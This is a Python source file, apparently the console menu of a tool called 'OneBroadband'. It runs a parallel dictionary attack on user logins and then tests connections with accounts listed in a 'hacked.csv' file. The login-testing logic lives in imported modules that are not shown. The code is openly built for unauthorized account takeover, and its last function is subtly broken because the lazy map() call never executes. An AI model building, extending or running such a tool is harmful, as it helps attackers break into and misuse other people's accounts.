from pyfiglet import Figlet
import os
from consolemenu import *
from consolemenu.items import *
from multiprocessing import *
from tqdm import *
import menu_logic as m
import attacks
from user import User




def main_menu():
    f = Figlet(font='slant')
    menu = ConsoleMenu(f.renderText('OneBroadband'))
    menu.append_item(FunctionItem("Dictionary Attack", dictionary_attack))
    menu.append_item(FunctionItem("Test Hacked Usernames", test_username_connection))
    menu.show()


def dictionary_attack():
    dict_path = input('Enter the dictionary filepath: ')

    if os.path.isfile(dict_path):
        tested = list(open('resources/tested.txt', 'r'))
        usernames = list(open(dict_path, 'r'))

        with Pool(cpu_count(), initializer=m.init, initargs=(tested,)) as p:
            with tqdm(total=len(usernames)) as pbar:
                for i, _ in enumerate(p.imap_unordered(m.test_login, usernames)):
                    pbar.update()

    else:
        main_menu()


def test_username_connection():
    if os.path.isfile('resources/hacked.csv'):
        users = m.get_hacked_users()
        map(m.test_connection,users)



